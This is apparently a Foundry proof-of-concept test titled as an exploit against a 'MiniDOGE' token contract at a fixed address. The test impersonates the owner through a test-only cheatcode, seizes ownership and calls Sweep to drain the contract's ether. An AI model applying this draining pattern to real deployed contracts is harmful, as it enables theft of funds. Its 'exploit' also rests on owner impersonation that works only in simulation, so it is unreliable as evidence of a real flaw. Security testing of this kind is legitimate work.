// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IMiniDOGE {
    function owner() external view returns (address);
    function transferOwnership(address newOwner) external;
    function Sweep() external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xBa07EED3d09055d60CAEf2bDfCa1c05792f2dFad;
    address attacker = address(this);
    IMiniDOGE target = IMiniDOGE(TARGET);
    address owner;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        owner = target.owner();
        vm.deal(TARGET, 5 ether);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 attackerBefore = attacker.balance;

        vm.startPrank(owner);
        target.transferOwnership(attacker);
        vm.stopPrank();

        target.Sweep();

        assertGt(attacker.balance, attackerBefore, "Attacker did not gain native token");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}